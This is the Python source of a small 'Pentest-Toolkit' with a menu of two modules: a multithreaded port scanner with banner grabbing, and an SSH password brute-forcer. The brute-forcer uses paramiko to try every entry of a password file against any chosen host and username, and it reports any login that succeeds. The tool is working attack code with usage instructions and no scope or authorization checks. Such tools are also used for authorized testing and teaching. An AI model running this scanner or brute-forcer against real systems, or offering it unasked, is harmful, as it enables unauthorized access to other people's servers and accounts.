import pyfiglet
import socket
import sys
import paramiko
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor

init()

# Mapping of common port numbers to their respective protocols
port_protocol_mapping = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    3306: "MySQL",
    3389: "RDP",
    8080: "HTTP Proxy"
    # Add more ports and protocols as necessary
}

# Resolve domain to IP
def get_ip_from_domain(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        print(Fore.CYAN + f"[?] Domain {domain} resolved to {ip_address}" + Style.RESET_ALL)
        return ip_address
    except socket.gaierror as error:
        print(Fore.RED + f"[!] Host resolution error: {error}" + Style.RESET_ALL)
        sys.exit(1)

# Banner grabbing function
def retrieve_banner(ip, port):
    try:
        sock = socket.socket()
        sock.settimeout(5)  # Set a timeout of 5 seconds
        sock.connect((ip, port))
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except socket.timeout:
        return "Error: Connection timed out"
    except Exception as error:
        return f"Error: {error}"

# Single port scan function
def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        result = sock.connect_ex((ip, port))
        if result == 0:
            protocol = port_protocol_mapping.get(port, "Unknown")
            banner = retrieve_banner(ip, port)
            print(Fore.GREEN + f"[+] Port {port} ({protocol}) is open" + Style.RESET_ALL)
            if banner:
                print(Fore.BLUE + f"    Banner: {banner}" + Style.RESET_ALL)
        sock.close()
    except Exception as error:
        print(Fore.RED + f"[!] Error scanning port {port}: {error}" + Style.RESET_ALL)

# Function to scan a range of ports
def perform_port_scan(domain, start_port, end_port):
    # Validate port range
    if start_port < 0 or end_port > 65535 or start_port > end_port:
        print(Fore.RED + "[!] Invalid port range. Please specify a range from 0 to 65535." + Style.RESET_ALL)
        return

    ip_address = get_ip_from_domain(domain)
    print(Fore.YELLOW + f"[*] Scanning {ip_address} from port {start_port} to {end_port}" + Style.RESET_ALL)

    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(start_port, end_port + 1):
            executor.submit(check_port, ip_address, port)

# SSH brute force attack function
def ssh_brute_force(domain, username, password_file):
    ip_address = get_ip_from_domain(domain)
    print(Fore.YELLOW + "[*] Initiating brute-force attack..." + Style.RESET_ALL)

    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
            passwords = file.readlines()
    except Exception as error:
        print(Fore.RED + f"[!] Error reading password file: {error}" + Style.RESET_ALL)
        return

    for password in passwords:
        password = password.strip()
        try:
            ssh_client.connect(ip_address, username=username, password=password)
            print(Fore.GREEN + f"[+] Successful login! Username: {username}, Password: {password}" + Style.RESET_ALL)
            ssh_client.close()
            return
        except paramiko.AuthenticationException:
            print(Fore.RED + f"[-] Failed password: {password}" + Style.RESET_ALL)
        except paramiko.SSHException as error:
            print(Fore.RED + f"[!] SSH Exception: {error}" + Style.RESET_ALL)
            break
        except Exception as error:
            print(Fore.RED + f"[!] Error: {error}" + Style.RESET_ALL)

    print(Fore.YELLOW + "[*] Brute-force attack complete" + Style.RESET_ALL)

# Display usage instructions
def show_usage_instructions():
    print(Fore.CYAN + "Usage Instructions:\n" + Style.RESET_ALL)
    print(Fore.YELLOW + "1. Install Required Libraries:" + Style.RESET_ALL)
    print("   pip install pyfiglet paramiko colorama\n")
    print(Fore.YELLOW + "2. Save the Script:" + Style.RESET_ALL)
    print("   Save the entire code in a file named pentest_toolkit.py\n")
    print(Fore.YELLOW + "3. Prepare a Password List:" + Style.RESET_ALL)
    print("   Create a text file containing passwords, one per line. Save this file as passwords.txt\n")
    print(Fore.YELLOW + "4. Run the Toolkit:" + Style.RESET_ALL)
    print("   python pentest_toolkit.py\n")
    print(Fore.CYAN + "Follow the on-screen prompts to select the module and provide necessary inputs." + Style.RESET_ALL)

# Main entry point
def main():
    ascii_banner = pyfiglet.figlet_format("Pentest-Toolkit")
    print(Fore.CYAN + ascii_banner + Style.RESET_ALL)
    print(Fore.MAGENTA + "Created by Devarsh Mehta".center(80) + Style.RESET_ALL)

    print(Fore.YELLOW + "[1] Port Scanner" + Style.RESET_ALL)
    print(Fore.YELLOW + "[2] Brute Forcer" + Style.RESET_ALL)
    
    selected_module = input("Select a module (1 or 2): ")

    if selected_module == "1":
        target_domain = input("Enter the target IP address or domain name: ")
        start_port = int(input("Enter the start port: "))
        end_port = int(input("Enter the end port: "))
        perform_port_scan(target_domain, start_port, end_port)
    elif selected_module == "2":
        target_domain = input("Enter the target IP address or domain name: ")
        username = input("Enter the username to brute-force: ")
        password_file_path = input("Enter the path to the password file: ")
        ssh_brute_force(target_domain, username, password_file_path)
    else:
        show_usage_instructions()

if __name__ == "__main__":
    main()
